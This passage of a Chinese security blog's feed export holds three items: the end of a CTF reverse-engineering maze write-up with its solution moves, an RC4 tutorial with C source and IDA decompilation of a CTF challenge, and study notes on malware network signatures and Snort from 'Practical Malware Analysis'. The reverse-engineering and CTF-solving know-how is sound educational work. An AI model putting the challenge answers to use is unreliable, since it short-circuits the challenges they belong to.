class="line">if ( *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](&amp;map, v10) &#x3D;&#x3D; &#39;o&#39; )</span><br><span class="line">  break;</span><br></pre></td></tr></table></figure></div><p>到达终点*<br><code>if ( *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](&amp;map, v10) == &#39;*&#39; )</code></p><p>v10原值为80，从0开始为第81位，于是从最后一个x出发，到达最上面*<br>走的步骤为<br><code>waaawaawwawawwdddw</code></p><p>刚好18位，运行程序，输入步骤，拿到flag</p><p><a href="https://i.loli.net/2018/10/07/5bb97f0197437.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/10/07/5bb97f0197437.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;SUS十一欢乐赛-re200-maze&quot;&gt;&lt;a href=&quot;#SUS十一欢乐赛-re200-maze&quot; class=&quot;headerlink&quot; title=&quot;SUS十一欢乐赛 re200 maze&quot;&gt;&lt;/a&gt;SUS十一欢乐赛 re200</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>RC4加密算法及逆向方法初探</title>
    <link href="https://kabeor.github.io/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/</id>
    <published>2018-09-23T16:00:00.000Z</published>
    <updated>2020-03-16T04:48:04.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RC4加密算法及逆向方法初探"><a href="#RC4加密算法及逆向方法初探" class="headerlink" title="RC4加密算法及逆向方法初探"></a>RC4加密算法及逆向方法初探</h1><p>看来可以写一个系列了</p><p>之前的两篇</p><p><a href="https://kabeor.cn/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">CRC校验算法及逆向方法初探</a></p><p><a href="https://kabeor.cn/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">Base-N算法及逆向初探</a></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 —-wiki <a href="https://zh.wikipedia.org/zh-hans/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/RC4</a></p><h3 id="加密-解密-原理"><a href="#加密-解密-原理" class="headerlink" title="加密(解密)原理"></a>加密(解密)原理</h3><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p></blockquote><p><strong>由于异或运算的对合性，RC4加密解密使用同一套算法。</strong></p><h3 id="C代码表示"><a href="#C代码表示" class="headerlink" title="C代码表示"></a>C代码表示</h3><p>先来看内部的几个基本变量</p><ol><li><p>S-Box 也就是所谓的S盒，是一个256长度的char型数组，每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换。</p></li><li><p>密钥K char key[256] 密钥的长度keylen与明文长度、密钥流的长度没有必然关系</p></li><li><p>临时向量k 长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将密钥的每个字节赋给k</p></li></ol><h4 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h4><blockquote><p>包含三个参数</p></blockquote><blockquote><p>参数1是一个256长度的char型数组，定义为: unsigned char sBox[256];</p></blockquote><blockquote><p>参数2是密钥，其内容可以随便定义：char key[256];</p></blockquote><blockquote><p>参数3是密钥的长度，Len = strlen(key);</p></blockquote><p>初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。</p><p>i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的。</p><p><a href="https://i.loli.net/2018/09/24/5ba8681ba7c54.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba8681ba7c54.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/09/24/5ba8682730f8d.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba8682730f8d.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2. 加解密"></a>2. 加解密</h4><blockquote><p>包含三个参数</p></blockquote><blockquote><p>参数1是上边rc4_init函数中，被搅乱的S-box;</p></blockquote><blockquote><p>参数2是需要加密的数据data;</p></blockquote><blockquote><p>参数3是data的长度.</p></blockquote><p>每收到一个字节，就进行while循环。通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</p><p><a href="https://i.loli.net/2018/09/24/5ba8683b7feb5.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba8683b7feb5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *Data,<span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="3-主函数"><a href="#3-主函数" class="headerlink" title="3. 主函数"></a>3. 主函数</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">"justfortest"</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"这是一个用来加密的数据Data"</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"key=%s,length=%d\n\n"</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key)); <span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"完成对S[i]的初始化，如下：\n\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02X"</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)           <span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经初始化，现在加密:\n\n"</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>拿今年九月安恒杯 NewDriver这道来看</p><p>栈平衡一下，然后f5</p><p><a href="https://i.loli.net/2018/09/24/5ba880432dd93.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba880432dd93.jpg" class="lazyload"></a></p><p>限制输入33位<br>base64加密<br>rc4加密</p><p>base64改了密码表，但结构很清晰，具体识别方法看我上一篇</p><p>rc4共有两个函数 sub_E41000,sub_E410E0<br>下面来具体分析这两个函数，具体解释都放在图里了，看图即可。</p><h3 id="sub-E41000-初始化"><a href="#sub-E41000-初始化" class="headerlink" title="sub_E41000 初始化"></a>sub_E41000 初始化</h3><p>函数头如下，三个值<br><code>sub_E41000(&amp;v6, &amp;v10, strlen(&amp;v10));</code><br>对应上面源码<br><code>void rc4_init(unsigned char *s,unsigned char *key, unsigned long Len)</code></p><h4 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h4><p><a href="https://i.loli.net/2018/09/24/5ba88343732b6.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba88343732b6.jpg" class="lazyload"></a></p><h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p>将0到255的互不重复的元素装入S盒</p><p><a href="https://i.loli.net/2018/09/24/5ba88746b7e93.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba88746b7e93.jpg" class="lazyload"></a></p><p>打乱S盒</p><p><a href="https://i.loli.net/2018/09/24/5ba8885101b9f.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba8885101b9f.jpg" class="lazyload"></a></p><h3 id="sub-E410E0-加密"><a href="#sub-E410E0-加密" class="headerlink" title="sub_E410E0 加密"></a>sub_E410E0 加密</h3><p><code>sub_E410E0(&amp;v6, v3, strlen(v3));</code><br>对应上面源码<br><code>void rc4_crypt(unsigned char *s,unsigned char *Data,unsigned long Len)</code></p><h4 id="伪代码-1"><a href="#伪代码-1" class="headerlink" title="伪代码"></a>伪代码</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_E410E0@&lt;eax&gt;(<span class="keyword">int</span> result@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">      v6 = *(v3 + result);</span><br><span class="line">      v4 = (v6 + v4) % <span class="number">256</span>;</span><br><span class="line">      *(v3 + result) = *(v4 + result);</span><br><span class="line">      *(v4 + result) = v6;</span><br><span class="line">      *(v5++ + a2) ^= *((v6 + *(v3 + result)) % <span class="number">256</span> + result);  <span class="comment">//   Data[k]^=s[t];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; a3 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>伪代码看的就很清晰了，IDA分析时将数组按指针形式显示</p><h4 id="反汇编-1"><a href="#反汇编-1" class="headerlink" title="反汇编"></a>反汇编</h4><p><a href="https://i.loli.net/2018/09/24/5ba889f6b7478.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba889f6b7478.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/09/24/5ba88a3f95be8.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/24/5ba88a3f95be8.jpg" class="lazyload"></a></p><p>0FFFFFF00h取负就是256</p><h2 id="魔改RC4"><a href="#魔改RC4" class="headerlink" title="魔改RC4"></a>魔改RC4</h2><p>其实RC4魔改还是比较难的，稍有改变，整个算法就完全不同了。因此，大多数赛题将rc4与其他算法进行组合来加密flag</p><p>常见变化位置</p><ol><li>密钥经过上一步的其他加密后传入</li><li>s盒内部数据固定</li><li>rc4加密后数据进行重加密</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人感觉rc4重点理解算法即可，并且对内部多次限制256次循环，mod256，以及对数据strlen的读取的特点注意即可</p><hr><p>参考网址：<br><a href="https://zh.wikipedia.org/zh-hans/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/RC4</a><br><a href="https://zh.wikipedia.org/wiki/S%E7%9B%92" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/S%E7%9B%92</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;RC4加密算法及逆向方法初探&quot;&gt;&lt;a href=&quot;#RC4加密算法及逆向方法初探&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第14章  恶意代码的网络特征</title>
    <link href="https://kabeor.github.io/%E7%AC%AC14%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/"/>
    <id>https://kabeor.github.io/%E7%AC%AC14%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/</id>
    <published>2018-09-22T16:00:00.000Z</published>
    <updated>2020-03-16T04:26:11.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第14章-恶意代码的网络特征"><a href="#第14章-恶意代码的网络特征" class="headerlink" title="第14章  恶意代码的网络特征"></a>第14章  恶意代码的网络特征</h1><h2 id="1-网络应对措施"><a href="#1-网络应对措施" class="headerlink" title="1. 网络应对措施"></a>1. 网络应对措施</h2><p>网络行为的基本属性包括IP地址、TCP与UDP端口、域名，以及流量内容等，网络和安全设备可以利用它们，来提供网络应对措施。根据IP地址和端口，防火墙和路由器可以限制对网络的访问。</p><p>配置DNS服务器，可以将一个已知的恶意域名重定向到内部主机，这被称为sinkhole技术。配置代理服务器，可以检测或者阻止访问某些域名。</p><h3 id="在原始环境中观察代码"><a href="#在原始环境中观察代码" class="headerlink" title="在原始环境中观察代码"></a>在原始环境中观察代码</h3><blockquote><p>真实环境捕获的信息将提供恶意应用程序真实行为的最佳视图，而恶意代码可以被编程，以加入探测实验环境的能力。</p></blockquote><blockquote><p>活跃恶意代码的真实场景信息能够提供独特的视角，来加快分析过程。真实流量提供了恶意代码在两个端点（客户端和服务器端）之间的通信信息，然而，在实验环境里，分析者通常只能获取其中一端的信息。而分析恶意代码如何接收内容（也就是解析例程），比起分析恶意代码如何产生内容，往往会更具挑战性。因此，双向的样本流量可以帮助分析师加快恶意代码解析例程的分析进度。</p></blockquote><blockquote><p>此外，当你被动地查看信息时，不存在泄露给攻击者分析活动的风险。</p></blockquote><h3 id="恶意行为的痕迹"><a href="#恶意行为的痕迹" class="headerlink" title="恶意行为的痕迹"></a>恶意行为的痕迹</h3><h3 id="OPSEC-操作安全性"><a href="#OPSEC-操作安全性" class="headerlink" title="OPSEC=操作安全性"></a>OPSEC=操作安全性</h3><p>OPSEC是政府和军方的一个术语，用来描述防止敌方获取敏感信息的过程。</p><h2 id="2-安全地调查在线攻击者"><a href="#2-安全地调查在线攻击者" class="headerlink" title="2.安全地调查在线攻击者"></a>2.安全地调查在线攻击者</h2><h3 id="间接性策略"><a href="#间接性策略" class="headerlink" title="间接性策略"></a>间接性策略</h3><p>一种间接策略是使用某些旨在提供匿名的服务或者机制，例如Tor，一个开放的代理，或者基于Web的匿名器。</p><p>另一种策略是使用专门的机器来研究，通常是虚拟机。</p><p>隐藏专用机器的具体位置的方法</p><ol><li>使用匿名的蜂窝连接。</li><li>通过安全shell（SSH）或者一个虚拟私有网络（VPN），将你的连接通过远程的基础设施来进行隧道传输。</li><li>使用运行在云服务中的一个临时远程机器，例如亚马逊的弹性计算云（亚马逊EC2）。</li></ol><h3 id="获取IP地址和域名信息"><a href="#获取IP地址和域名信息" class="headerlink" title="获取IP地址和域名信息"></a>获取IP地址和域名信息</h3><blockquote><p>Domain Tools（<a href="http://www.domaintools.com/）" target="_blank" rel="noopener">http://www.domaintools.com/）</a></p></blockquote><p>这个网站提供了whois历史记录的查询，能够进行反向IP查询，来显示所有解析成某个特定IP地址的域名，以及反向whois查询。反向whois查询允许基于联系人信息的元数据，来进行whois记录查询。</p><blockquote><p>RobTex（http:/<a href="http://www.robtex.com/）" target="_blank" rel="noopener">www.robtex.com/）</a></p></blockquote><p>这个网站能提供指向单个IP地址的多个域名信息，另外也集成其他一些有价值的信息</p><blockquote><p>BFK DNS logger（<a href="http://www.bfk.de/bfk_dnslogger_en.htm/）" target="_blank" rel="noopener">http://www.bfk.de/bfk_dnslogger_en.htm/）</a></p></blockquote><p>这个网站使用被动DNS监测信息。</p><h2 id="3-基于内容的网络应对措施"><a href="#3-基于内容的网络应对措施" class="headerlink" title="3. 基于内容的网络应对措施"></a>3. 基于内容的网络应对措施</h2><h3 id="使用Snort进行入侵检测"><a href="#使用Snort进行入侵检测" class="headerlink" title="使用Snort进行入侵检测"></a>使用Snort进行入侵检测</h3><p>Snort是最流行的入侵检测系统之一。Snort被用来生成网络特征或者规则，这些规则由一系列元素（被称作是规则选项）连接在一起，而只有这些元素均为真时，规则才会被触发。主要的规则选项被分为：识别内容元素的规则选项（在Snort系统术语中被称为负载规则选项），以及内容无关的规则选项（称作非负载规则选项）。非负载规则选项的例子中包括某些特定标志位，TCP或IP头中的特定值，以及包负载的大小。</p><blockquote><p>Snort规则关键字描述</p></blockquote><p><a href="https://i.loli.net/2018/09/23/5ba7513ac3cdd.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/23/5ba7513ac3cdd.jpg" class="lazyload"></a></p><h3 id="深入观察"><a href="#深入观察" class="headerlink" title="深入观察"></a>深入观察</h3><p><a href="https://i.loli.net/2018/09/23/5ba751667c26b.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/23/5ba751667c26b.jpg" class="lazyload"></a></p><h2 id="4-结合动态和静态分析技术"><a href="#4-结合动态和静态分析技术" class="headerlink" title="4. 结合动态和静态分析技术"></a>4. 结合动态和静态分析技术</h2><h3 id="过度分析的危险"><a href="#过度分析的危险" class="headerlink" title="过度分析的危险"></a>过度分析的危险</h3><blockquote><p>恶意代码分析深入级别</p></blockquote><p><a href="https://i.loli.net/2018/09/23/5ba7522329dfb.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/23/5ba7522329dfb.jpg" class="lazyload"></a></p><h3 id="在众目睽睽下隐藏"><a href="#在众目睽睽下隐藏" class="headerlink" title="在众目睽睽下隐藏"></a>在众目睽睽下隐藏</h3><ol><li>攻击者模拟现有的协议</li><li>攻击者利用现有的基础设施</li><li>利用客户端发出的信令</li></ol><h3 id="理解周边代码"><a href="#理解周边代码" class="headerlink" title="理解周边代码"></a>理解周边代码</h3><p>网络行为有两种类型：发送数据和接收数据。分析发送出去的数据通常比较容易，因为无论恶意代码何时运行，它都会产生出便于分析的样本。</p><h3 id="寻找网络操作代码"><a href="#寻找网络操作代码" class="headerlink" title="寻找网络操作代码"></a>寻找网络操作代码</h3><p><a href="https://i.loli.net/2018/09/23/5ba7536b5bb82.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/23/5ba7536b5bb82.jpg" class="lazyload"></a></p><h3 id="了解网络内容的来源"><a href="#了解网络内容的来源" class="headerlink" title="了解网络内容的来源"></a>了解网络内容的来源</h3><p>特征生成中最有价值的元素是恶意代码中的硬编码数据。恶意代码发送的网络流量是从一组有限数据源中构造的。创建出有效特征，需要对每一块网络内容的数据来源有所了解。</p><p>下面是一些基本的数据源：</p><ol><li>随机数据（例如调用生成伪随机值函数所返回的数据）。</li><li>来源于标准网络库的数据（例如调用HTTPSendRequest创建的GET请求）。</li><li>来源于恶意代码的硬编码数据（例如一个硬编码的User-Agent字符串）。</li><li>关于主机及其配置信息的数据（例如主机名，根据系统时钟的当前时间、CPU速率等）。</li><li>从其他来源接收的数据，例如远程服务器或者文件系统（例如，服务器发送的用于加密的随机数、本地文件，以及键盘记录器捕获信息等）。</li></ol><h3 id="硬编码数据-vs-临时数据"><a href="#硬编码数据-vs-临时数据" class="headerlink" title="硬编码数据 vs. 临时数据"></a>硬编码数据 vs. 临时数据</h3><p>与使用高层网络API（如COM接口）相比，恶意代码使用低层网络API（如Winsock）时，需要更多手动生成的内容来模仿常见流量。更多的手动生成内容就意味着更多的硬编码数据，从而增加了恶意代码编写者犯错误的可能性，你可以利用这些错误来生成网络特征。</p><h3 id="确定和利用编码步骤"><a href="#确定和利用编码步骤" class="headerlink" title="确定和利用编码步骤"></a>确定和利用编码步骤</h3><h3 id="创建特征"><a href="#创建特征" class="headerlink" title="创建特征"></a>创建特征</h3><h3 id="分析解析例程"><a href="#分析解析例程" class="headerlink" title="分析解析例程"></a>分析解析例程</h3><h3 id="针对多个元素"><a href="#针对多个元素" class="headerlink" title="针对多个元素"></a>针对多个元素</h3><h2 id="5-了解攻击者的意图"><a href="#5-了解攻击者的意图" class="headerlink" title="5. 了解攻击者的意图"></a>5. 了解攻击者的意图</h2><blockquote><p>利用攻击者的弱点</p></blockquote><ol><li>专注属于两端之间的协议元素</li><li>专注于已知的任何协议元素作为密钥的部分</li><li>确定流量中不太明显的协议元素</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第14章-恶意代码的网络特征&quot;&gt;&lt;a href=&quot;#第14章-恶意代码的网络特征&quot; class=&quot;headerlink&quot; title=&quot;第14章  恶意代码的网络特征&quot;&gt;&lt;/a&gt;第14章  恶意代码的网络特征&lt;/h1&gt;&lt;h2 id=&quot;1-网络应对措施&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux程序破解与反破解</title>
    <link href="https://kabeor.github.io/Linux%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%8F%8D%E7%A0%B4%E8%A7%A3/"/>
    <id>https://kabeor.github.io/Linux%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%8F%8D%E7%A0%B4%E8%A7%A3/</id>
    <published>2018-09-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:45:27.542Z</updated>
    
